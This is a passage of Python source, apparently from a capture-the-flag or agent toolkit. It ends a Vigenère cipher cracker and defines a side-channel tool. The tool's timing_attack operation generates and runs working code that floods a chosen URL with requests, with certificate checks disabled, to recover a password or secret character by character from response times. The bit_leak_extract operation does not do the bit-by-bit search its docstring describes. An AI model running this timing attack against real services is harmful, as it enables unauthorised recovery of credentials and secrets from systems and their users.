           0.0633,0.0906,0.0276,0.0098,0.0236,0.0015,0.0197,0.0007]

key = []
for i in range(kl):
    col = ct[i::kl]
    best_shift, best_score = 0, -999
    for shift in range(26):
        dec = ''.join(chr((ord(c)-65-shift)%26+65) for c in col)
        freq = [dec.count(chr(65+j))/len(dec) for j in range(26)]
        score = sum(freq[j]*EN_FREQ[j] for j in range(26))
        if score > best_score:
            best_score, best_shift = score, shift
    key.append(chr(best_shift+65))

key_str = ''.join(key)
print(f'Key: {{key_str}}')
# Decrypt
plaintext = ''.join(chr((ord(c)-65-ord(k)-65)%26+65) for c,k in zip(ct, itertools.cycle(key_str)))
print(f'Decrypted: {{plaintext[:200]}}')
"""
        return tool_execute_python(code, timeout=15)

    return "Operations: crack, kasiski, ic_key_length, recover_key"


def tool_side_channel(operation: str = "timing_attack", target_url: str = "",
                      param: str = "password", charset: str = "0123456789abcdefghijklmnopqrstuvwxyz",
                      known_prefix: str = "", secret_len: int = 32,
                      method: str = "POST", samples: int = 5,
                      headers: dict = None, cookies: dict = None,
                      measurements: list = None) -> str:
    """Statistical timing and side-channel attack helper.
    Ops: timing_attack (measure response times per char to find secret byte-by-byte),
    analyze_timings (given list of (char, time) pairs, identify outlier),
    bit_leak_extract (binary search timing oracle — finds secret bit-by-bit)."""

    if operation == "timing_attack":
        if not target_url: return "Provide target_url="
        code = f"""
import requests, time, statistics, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
param = {repr(param)}
method = {repr(method)}
charset = {repr(charset)}
prefix = {repr(known_prefix)}
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}
samples = {samples}
secret_len = {secret_len}

def measure(guess):
    times = []
    for _ in range(samples):
        t0 = time.perf_counter()
        try:
            if method == 'POST':
                requests.post(url, data={{param: guess}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
            else:
                requests.get(url, params={{param: guess}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
        except: pass
        times.append(time.perf_counter()-t0)
    return statistics.median(times)

found = prefix
for pos in range(len(prefix), secret_len):
    best_char, best_time = None, 0
    times = {{}}
    for c in charset:
        guess = found + c
        t = measure(guess)
        times[c] = t
        if t > best_time:
            best_time, best_char = t, c
    # Check if the winner is statistically significant
    all_times = list(times.values())
    mean_t = statistics.mean(all_times)
    std_t = statistics.stdev(all_times) if len(all_times) > 1 else 0
    z_score = (best_time - mean_t) / (std_t + 1e-9)
    if z_score > 2.0:
        found += best_char
        print(f'[+] pos={{pos}}: {{best_char!r}} (t={{best_time*1000:.1f}}ms, z={{z_score:.1f}})')
    else:
        print(f'[?] pos={{pos}}: ambiguous (best={{best_char!r}} t={{best_time*1000:.1f}}ms z={{z_score:.1f}}) — may need more samples')
        found += best_char  # take best guess anyway

print(f'\\nRecovered: {{found}}')
"""
        return tool_execute_python(code, timeout=600)

    if operation == "analyze_timings":
        if not measurements: return "Provide measurements=[(char, time_seconds), ...]"
        code = f"""
import statistics
data = {measurements}
if not data: exit()
chars, times = zip(*data)
mean_t = statistics.mean(times)
std_t = statistics.stdev(times) if len(times)>1 else 0
print('Timing analysis:')
ranked = sorted(zip(chars, times), key=lambda x: -x[1])
for c, t in ranked[:10]:
    z = (t - mean_t) / (std_t + 1e-9)
    flag = ' <-- OUTLIER (likely correct char)' if z > 2 else ''
    print(f'  {{repr(c)}}: {{t*1000:.2f}}ms  (z={{z:.2f}}){flag}')
print(f'\\nmean={{mean_t*1000:.2f}}ms  std={{std_t*1000:.2f}}ms')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "bit_leak_extract":
        if not target_url: return "Provide target_url="
        return (f"Bit-level timing oracle: send characters from charset one at a time\n"
                f"and measure response time per position.\n"
                f"Use operation=timing_attack with samples=10+ for statistical significance.\n"
                f"Target: {target_url}  Param: {param}\n"
                f"Charset: {charset}")

    return "Operations: timing_attack, analyze_timings, bit_leak_extract"

